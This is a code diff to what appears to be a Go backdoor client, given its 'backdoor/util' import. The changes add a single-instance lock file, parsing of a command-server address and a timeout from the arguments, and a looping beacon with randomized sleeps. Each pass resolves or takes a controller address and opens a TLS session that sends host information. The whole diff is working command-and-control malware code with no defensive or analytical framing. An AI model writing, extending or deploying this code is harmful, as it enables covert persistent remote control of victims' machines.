@@ -3,6 +3,7 @@ package main
 import (
 	"backdoor/util"
 	"encoding/json"
+	"fmt"
 	"math/rand"
 	"net"
 	"os"
@@ -17,23 +18,26 @@ import (
 var guuid string
 
 func init() {
-	//rand.Seed(time.Now().Unix())
-	//go client()
+	rand.Seed(time.Now().Unix())
+	//go start("", 0)
 }
 
 func canStart(fileDir string, fileName string) bool {
+	var fileaddr string
 	if len(fileDir) != 0 {
-		os.Chdir(fileDir)
+		fileaddr = filepath.Join(fileDir, fileName)
+	} else {
+		fileaddr = fileName
 	}
-	pfile, err := os.Create(fileName)
+	pfile, err := os.Create(fileaddr)
 	if err != nil {
 		return false
 	}
 	pfile.Close()
-	if err := os.Rename(fileName, fileName); err != nil {
+	if err := os.Rename(fileaddr, fileaddr); err != nil {
 		return false
 	}
-	os.Open(fileName)
+	os.Open(fileaddr)
 	return true
 }
 
@@ -42,42 +46,51 @@ func main() {
 	if execPath, err := os.Executable(); err == nil {
 		dirpath = filepath.Dir(execPath)
 	}
-	if !canStart(dirpath, "test.txt") {
+	if !canStart(dirpath, "config.ini") {
 		return
 	}
-	if len(os.Args) < 2 {
-		return
-	}
+	var dstip string
 	var timeout int64
-	if len(os.Args) >= 3 {
-		timeout, _ = strconv.ParseInt(os.Args[2], 10, 64)
+	for i := 1; i < len(os.Args); i++ {
+		value, err := strconv.ParseInt(os.Args[i], 10, 64)
+		if err == nil {
+			timeout = value
+			break
+		}
 	}
+	for i := 1; i < len(os.Args); i++ {
+		tmpip, tmport, ok := util.ParseIP(os.Args[i])
+		if ok {
+			dstip = fmt.Sprintf("%s:%d", tmpip, tmport)
+			break
+		}
+	}
+	start(dstip, timeout)
+}
+
+func start(customip string, timeout int64) {
 	guuid = uuid.New().String()
+	var address string
 	for {
 		if timeout > 0 {
 			time.Sleep(time.Duration(timeout * int64(time.Second)))
 		} else {
 			time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
 		}
-		session(os.Args[1])
+		if len(customip) != 0 {
+			session(customip)
+			continue
+		}
+		tmpAddress := getIP()
+		if len(tmpAddress) != 0 {
+			address = tmpAddress
+		}
+		if len(address) == 0 {
+			continue
+		}
+		session(address)
 	}
 }
-
-// func client() {
-// 	guuid = uuid.New().String()
-// 	var address string
-// 	for {
-// 		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
-// 		tmpAddress, err := getIP()
-// 		if err == nil {
-// 			address = tmpAddress
-// 		}
-// 		if len(address) == 0 {
-// 			continue
-// 		}
-// 		session(address)
-// 	}
-// }
 
 func session(address string) {
 	conn, err := net.DialTimeout("tcp", address, 30*time.Second)
@@ -87,7 +100,7 @@ func session(address string) {
 	sslconn := util.NewSSLConn(conn)
 	defer sslconn.Close()
 	sendInfoReq(sslconn)
-	sslconn.SetReadDeadline(time.Now().Add(60 * time.Second))
+	sslconn.SetReadDeadline(time.Now().Add(12 * time.Second))
 	infoRsp, err := sslconn.Read()
 	if err != nil {
 		return
